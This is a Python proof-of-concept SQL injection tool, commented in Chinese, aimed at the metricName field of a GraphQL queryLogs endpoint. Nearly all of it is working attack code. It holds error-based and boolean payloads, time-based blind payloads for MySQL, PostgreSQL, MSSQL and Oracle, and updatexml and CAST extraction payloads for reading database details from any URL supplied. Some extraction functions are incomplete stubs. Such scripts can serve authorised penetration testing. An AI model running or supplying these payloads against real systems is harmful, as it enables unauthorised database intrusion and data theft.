#!/usr/bin/env python3
"""
GraphQL SQL Injection POC (Error-based / Time-based)
用法: python3 graphql_sqli.py <url> [--payload PAYLOAD] [--detect] [--dump DBMS]
示例: python3 graphql_sqli.py http://localhost:8080/graphql --detect
      python3 graphql_sqli.py http://localhost:8080/graphql --payload "' OR 1=1--"
      python3 graphql_sqli.py http://localhost:8080/graphql --dump version
"""

import sys
import argparse
import json
import requests
import time

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

# 默认GraphQL查询模板（可根据实际修改）
GRAPHQL_QUERY = """
query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
"""

# 默认变量结构，注入点在 metricName
DEFAULT_VARIABLES = {
    "condition": {
        "metricName": "PLACEHOLDER",  # 注入点
        "state": "ALL",
        "paging": {
            "pageSize": 10
        }
    }
}


class GraphQLSQLiPOC:
    def __init__(self, url, timeout=10, verify=False):
        self.url = url
        self.timeout = timeout
        self.verify = verify
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (GraphQL SQLi POC)",
            "Content-Type": "application/json"
        })

    def send_query(self, metric_name):
        """发送GraphQL请求，注入自定义metricName"""
        variables = {
            "condition": {
                "metricName": metric_name,
                "state": "ALL",
                "paging": {"pageSize": 10}
            }
        }
        payload = {
            "query": GRAPHQL_QUERY.strip(),
            "variables": variables
        }
        try:
            resp = self.session.post(self.url, json=payload,
                                     timeout=self.timeout, verify=self.verify)
            return resp
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            return None

    def detect_error(self):
        """通过错误回显检测SQL注入"""
        # 发送正常请求，获取基线
        normal_resp = self.send_query("normal_test")
        if not normal_resp:
            return False

        # 发送注入请求，触发SQL错误
        error_payload = "'"
        error_resp = self.send_query(error_payload)
        if not error_resp:
            return False

        # 检查响应差异：状态码变化、包含SQL错误关键字
        if error_resp.status_code != normal_resp.status_code:
            print("[+] 状态码变化，可能存在注入")
            return True
        error_keywords = ["sql", "error", "syntax", "exception", "database", "invalid"]
        if any(keyword in error_resp.text.lower() for keyword in error_keywords):
            print("[+] 响应包含SQL错误关键字，存在注入")
            return True

        # 进一步：尝试闭合引号并注释
        test_payload = "' OR '1'='1"
        test_resp = self.send_query(test_payload)
        if test_resp and test_resp.status_code == 200:
            # 检查返回数据量是否变化（需具体分析，此处简单判断）
            if len(test_resp.text) > 0 and test_resp.text != normal_resp.text:
                print("[+] 布尔/错误注入可能存在")
                return True
        return False

    def time_based_detect(self):
        """基于时间的盲注检测"""
        # 正常请求耗时
        normal_resp = self.send_query("normal_test")
        if not normal_resp:
            return False
        normal_time = normal_resp.elapsed.total_seconds()

        # 注入延时payload (MySQL: SLEEP(5), PostgreSQL: pg_sleep(5), MSSQL: WAITFOR DELAY)
        delay_payloads = {
            "mysql": "' AND SLEEP(5)-- ",
            "postgresql": "'; SELECT pg_sleep(5)--",
            "mssql": "'; WAITFOR DELAY '0:0:5'--",
            "oracle": "' AND DBMS_LOCK.SLEEP(5)--"
        }
        for db, payload in delay_payloads.items():
            start = time.time()
            resp = self.send_query(payload)
            elapsed = time.time() - start
            if elapsed >= 5:
                print(f"[+] 基于时间的盲注有效，数据库可能是 {db}")
                return True
        return False

    def error_based_dump(self, query, db_type="mysql"):
        """利用错误回显提取数据，需根据实际错误回显构造payload"""
        # 示例：使用extractvalue/updatexml (MySQL) 或 类型转换错误 (PostgreSQL)
        if db_type == "mysql":
            # 提取数据库版本
            payload = f"' AND updatexml(1,concat(0x7e,({query})),1)-- "
        elif db_type == "postgresql":
            payload = f"' AND 1=CAST(({query}) AS int)--"
        else:
            print("[-] 不支持的数据类型")
            return None
        resp = self.send_query(payload)
        if resp:
            # 尝试从响应中提取错误信息
            return resp.text
        return None

    def dump_info(self, info_type="version"):
        """提取数据库信息"""
        if info_type == "version":
            if self.error_based_dump("@@version", "mysql"):
                # 实际提取逻辑需解析响应中的错误
                print("[*] 尝试 MySQL 版本提取...")
            elif self.error_based_dump("version()", "postgresql"):
                print("[*] 尝试 PostgreSQL 版本提取...")
            else:
                print("[-] 无法提取版本信息，请手动指定payload")
        elif info_type == "tables":
            # 示例：提取表名
            pass
        else:
            print("[-] 不支持的信息类型")


def main():
    parser = argparse.ArgumentParser(description="GraphQL SQL Injection POC")
    parser.add_argument("url", help="目标GraphQL端点，如 http://example.com/graphql")
    parser.add_argument("--detect", action="store_true", help="检测SQL注入漏洞")
    parser.add_argument("--payload", help="自定义注入payload（替换metricName）")
    parser.add_argument("--time", action="store_true", help="使用时间盲注检测")
    parser.add_argument("--dump", choices=["version", "tables", "columns", "data"],
                        help="尝试利用注入提取信息（实验性）")
    parser.add_argument("--dbtype", choices=["mysql", "postgresql", "mssql", "oracle"],
                        default="mysql", help="目标数据库类型")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时时间")
    parser.add_argument("--no-verify", action="store_true", help="不验证SSL证书")
    args = parser.parse_args()

    poc = GraphQLSQLiPOC(args.url, timeout=args.timeout, verify=not args.no_verify)

    if args.detect:
        print("[*] 使用错误回显检测SQL注入...")
        if poc.detect_error():
            print("[✔] 错误回显检测：存在SQL注入")
        else:
            print("[-] 错误回显检测：未发现注入")
        if args.time:
            print("[*] 使用时间盲注检测...")
            if poc.time_based_detect():
                print("[✔] 时间盲注检测：存在SQL注入")
            else:
                print("[-] 时间盲注检测：未发现注入")
    elif args.payload:
        print(f"[*] 发送自定义payload: {args.payload}")
        resp = poc.send_query(args.payload)
        if resp:
            print(f"[+] 响应状态码: {resp.status_code}")
            print(f"[+] 响应内容:\n{resp.text[:500]}")
        else:
            print("[-] 无响应")
    elif args.dump:
        print(f"[*] 尝试提取: {args.dump} (数据库类型: {args.dbtype})")
        poc.dump_info(args.dump)
    else:
        # 默认执行检测
        print("[*] 未指定操作，默认执行错误回显检测...")
        if poc.detect_error():
            print("[✔] 发现SQL注入，可使用 --dump version 尝试提取版本")
        else:
            print("[-] 未发现注入，可尝试 --time 进行时间盲注检测")
        if args.time:
            poc.time_based_detect()


if __name__ == "__main__":
    main()